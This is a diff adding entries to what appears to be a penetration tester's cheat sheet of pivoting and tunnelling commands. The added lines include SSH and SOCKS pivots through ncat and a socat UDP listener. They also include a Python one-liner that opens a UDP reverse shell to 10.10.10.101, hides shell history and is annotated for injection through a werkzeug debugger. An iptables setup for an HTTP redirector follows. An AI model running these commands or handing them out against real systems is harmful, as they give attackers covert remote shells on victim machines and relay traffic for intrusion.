@@ -95,6 +95,27 @@ socat -v tcp-connect:localhost:8080,reuseaddr tcp-connect:localhost:9090	#localh
 ncat localhost -p 8080 < file		#remote host
 ncat localhost -lp 9090 > newfile	#remote host
 
+SSH via ncat tunnel
+ssh -o ProxyCommand="ssh -q $router ncat %h %p" $host
+ssh router -D 8080
+ncat --proxy localhost:8080 --proxy-type socks4 10.10.10.101
+
+socat
+socat file:`tty`,echo=0,raw  udp-listen:6169
+	--socat UDP listenener
+import subprocess; subprocess.Popen(["python", "-c", 'import os; import pty; import socket; s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM); s.connect(("10.10.10.101", 6169)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); os.putenv("HISTFILE","/dev/null"); pty.spawn("/bin/bash"); s.close();'])
+	--udp reverse shell for interactive console input
+		--e.g. from werkzeug debugger
+socat TCP4-LISTEN:80,fork TCP4:REMOTE-HOST-IP-ADDRESS:80
+iptables -I INPUT -p tcp -m tcp --dport 80 -j ACCEPT
+iptables -t nat -A PREROUTING -p tcp --dport 80 -j DNAT --to-destination REMOTEADDR:80
+iptables -t nat -A POSTROUTING -j MASQUERADE
+iptables -I FORWARD -j ACCEPT
+iptables -P FORWARD ACCEPT
+sysctl net.ipv4.ip_forward=1
+	--HTTP redirctor
+	
+
 Build port relay, Windows 7+
 netsh interface portproxy add v4tov4 listenport=<LPORT> listenaddress=0.0.0.0 connectport=<RPORT> connectaddress=<RHOST>
 
